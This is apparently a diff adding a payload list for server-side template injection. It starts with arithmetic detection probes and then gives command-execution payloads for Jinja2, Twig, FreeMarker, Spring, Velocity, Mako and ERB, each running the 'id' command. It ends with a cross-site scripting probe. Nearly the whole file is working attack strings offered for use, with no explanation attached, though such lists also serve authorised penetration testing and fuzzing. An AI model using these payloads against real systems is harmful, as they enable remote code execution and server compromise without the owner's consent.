@@ -1,0 +1,28 @@
+# General detection
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+# Jinja2 / Python
+{{config.items()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+# Twig / PHP
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{app.request.server.all|join(',')}}
+{{['id']|filter('system')}}
+# Java / Spring / FreeMarker
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+${"freemarker.template.utility.Execute"?new()("id")}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+# Velocity
+#set($engine="")
+#set($run=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
+# Mako
+${self.module.cache.util.os.popen('id').read()}
+# Ruby / ERB
+<%= system('id') %>
+<%= `id` %>
+<img src=x onerror=alert(1) <%= "a" %> >
